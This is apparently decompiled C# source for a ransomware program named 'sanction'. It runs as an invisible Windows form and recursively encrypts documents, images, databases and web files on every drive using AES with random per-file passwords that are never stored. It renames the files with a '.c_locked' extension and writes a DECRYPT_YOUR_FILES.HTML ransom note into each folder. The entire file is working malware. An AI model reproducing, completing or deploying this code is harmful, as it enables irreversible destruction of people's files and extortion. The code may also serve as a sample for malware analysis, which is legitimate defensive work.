using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using sanction.Properties;

namespace sanction;

public class Form1 : Form
{
	private string userName = Environment.UserName;

	private string userNameG = Guid.NewGuid().ToString();

	private int cout;

	private string password;

	private string tpatch = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "conf.conf");

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		go();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public byte[] Lock(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public void LockFile(string file)
	{
		Random random = new Random();
		password = GetPass(random.Next(30, 50));
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = Lock(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".c_locked");
	}

	public void lockdir(string location, string password, string[] words)
	{
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				string extension = Path.GetExtension(files[i]);
				if (words.Contains(extension))
				{
					cout++;
					LockFile(files[i]);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			try
			{
				lockdir(directories[j], password, words);
				WriteInfo(directories[j]);
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		}
	}

	public void WriteInfo(string path)
	{
		string _ = Resources._1;
		_ = _.Replace("$userNameG", userNameG);
		File.WriteAllText(path + "\\DECRYPT_YOUR_FILES.HTML", _);
	}

	public static string GetPass(int x)
	{
		string text = "";
		Random random = new Random();
		while (text.Length < x)
		{
			char c = (char)random.Next(33, 125);
			if (char.IsLetterOrDigit(c))
			{
				text += c;
			}
		}
		return text;
	}

	public void go()
	{
		Random random = new Random();
		random.Next(30, 50);
		string[] words = new string[24]
		{
			".txt", ".qbb", ".pdf", ".doc", ".adi", ".adt", ".docx", ".altr", ".xls", ".xlsx",
			".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", "sln", ".php", ".asp",
			".aspx", ".html", ".xml", ".psd"
		};
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			try
			{
				lockdir(driveInfo.RootDirectory.ToString(), password, words);
			}
			catch (IOException)
			{
			}
		}
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1, 1));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
